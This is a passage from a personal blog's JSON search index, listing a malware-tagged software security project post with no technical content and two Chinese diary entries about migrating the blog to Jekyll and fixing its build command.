        "excerpt":"   Malware vs2010      InfoCollection   configure      warning      ","categories": [],
        "tags": ["malware"],
        "url": "https://zjgcjy.github.io/posts/2019-10/Software_Security_Project.html",
        "teaser":null},{
        "title": "Dirary_november",
        "excerpt":"   每日所作所得      11月1日  ","categories": [],
        "tags": ["日记"],
        "url": "https://zjgcjy.github.io/posts/2019-11/Dirary_November.html",
        "teaser":null},{
        "title": "Diary_notes",
        "excerpt":"   最近很浮躁，日记好久没写了，书也没看，论文也没看，运动也是断断续续。    12月5日   打算重新开blog，找了很久，从stackedit到blogger，从hexo到wordpress再到jekyll。因为图片的缘故，还在vps上搭了rclone来同步onedrive当图床用，后来又用git repo来当图床（结果发现URL被墙了）。烦。   12月10日   重开blog，公开所有posts，采用Jekyll格式。   三个repo，其中markdown原文未公开。     blog source   blog site   posts (private)   12月11日   review Jekyll source，fork了一份开始改，基本没啥问题了，由于之前没用过jekyll，有点不熟悉。   12月12日   花了一天的时间改code。基本是confige的部分，还有我以前的posts的格式不满足Jekyll的识别要求，以及image的相对链接地址。 基本都改完了，除了comments部分，disqus由于被墙了，需要梯子，但是还有一个问题是comments的布局错乱，不清楚原因。晚上的时候去源repo提了issue。   12月13日   USTC的大佬回了issue，最后检查是发布的时候命令用错了issue link，我使用的是jekyll build JEKYLL_ENV=production貌似这样后面的环境变量没起作用，但是我测试应该是一部分起作用了，一脸懵逼。真正发布的命令是JEKYLL_ENV=production bundle exec jekyll build。   晚上的时候还修改了toc，可以stricky，最后修改了columns的width，这样posts的内容可以占到80%左右。   todo list on site:     import visit speed &amp; add cdn 目前速度有点慢，一是disqus被墙，二是font awesome被墙。   add github action 整合3个repo，采用CD &amp; CL，自动发布   merge image to posts 整合所有image到posts repo，而不是blog source repo，或者用一个单独的repo   ","categories": [],
        "tags": ["日记"],
        "url": "https://zjgcjy.github.io/posts/2019-12/diary_notes.html",
        "teaser":null}]
